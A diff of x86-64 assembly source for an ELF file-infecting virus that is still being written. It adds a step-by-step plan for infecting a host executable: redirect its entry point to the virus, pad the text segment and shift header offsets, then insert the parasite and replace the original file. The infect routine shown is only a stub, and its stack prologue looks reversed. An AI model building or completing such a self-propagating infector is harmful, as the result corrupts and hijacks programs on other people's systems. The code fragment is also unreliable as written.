@@ -135,6 +135,7 @@ checkarchfaillen equ $-checkarchfail
 elf_header: times 4 dq 0
 file_stat_temp: times 13 dq 0
 
+vxhostentry: dq 0
 
 
 
@@ -532,12 +533,69 @@ payload:
 ;****************************************************************************************
 ;	Infection routine:
 ;
+;	assumes the following:
+; 	vlen == length of virus code
+;	PAGESIZE == 4096	
+;
+;	1. identify entry point of host program and patch virus code to jump back to original
+;	host entry point
+;	2. 	a. copy ELF header from host program to virus;
+;		b. change e_shoff in virus ELF header to new e_shoff s.t. 
+;			new_vx_e_shoff = host_e_shoff + PAGESIZE
+;	3. 	a. Loop through all Phdrs to find the text segment Phdr
+;		b. if curr_Phdr == text_segment_Phdr then, do the following:
+;			i. modify entry point of ELF header to point to the virus code
+;			ii. increase p_filesz by vlen [p_filesz += vlen] 
+;			iii. increase p_memsz by vlen, [p_memsz += vlen]
+;		c. Else, for all Phdrs corresponding to segments located after the inserted virus code (aka for each Phdr of a segment after the text segment), then, do the following:
+;			i. increase p_offset by PAGESIZE
+;	4. Loop through all Shdrs
+;		a. If curr_shdr == last_shdr_text_segment then,
+;			i. increase sh_len by vlen [sh_len += vlen]
+;		b. Else, for all Shdrs corresponding to sections located after the inserted virus code (aka for each Shdr of a section after virus code), then, do the following:
+;			i. increase sh_offset by PAGESIZE [sh_offset += PAGESIZE]
+;	5. Insert the virus code into the host program (or, in our case, into the tempfile we are constructing to replace host program)
 ;
 ;****************************************************************************************
 
 infect:
+	push rbp
+	mov rsp, rbp
+	mov r13, rax
+	mov r12, [rax + elf_ehdr.phoff]		;address of host ELF Program Header Table in r12
+	mov r15, [rax + elf_ehdr.shoff] 	;address of host ELF Section Header Table in r15
+	
+	
+
+
+
+
+	pop rbp
+
 	jmp printteststr
 	
+
+;****************************************************************************************
+;	From silvio's article [1], we know that an infected ELF will have 
+;	the following layout:
+;
+;	ELF Header
+;	Program Header Table
+;	Segment 1
+;		text
+;		parasite
+;
+;	Segment 2
+;	Section Header Table
+;	Section 1
+;	...
+;	Section n
+;
+;	So this is the order in which we will construct (write to) our new complete
+;	infected ELF -- currently a temp file, to be renamed to that of the host
+;
+;
+;****************************************************************************************
 
 ;;restore stack to original state
 _restore:
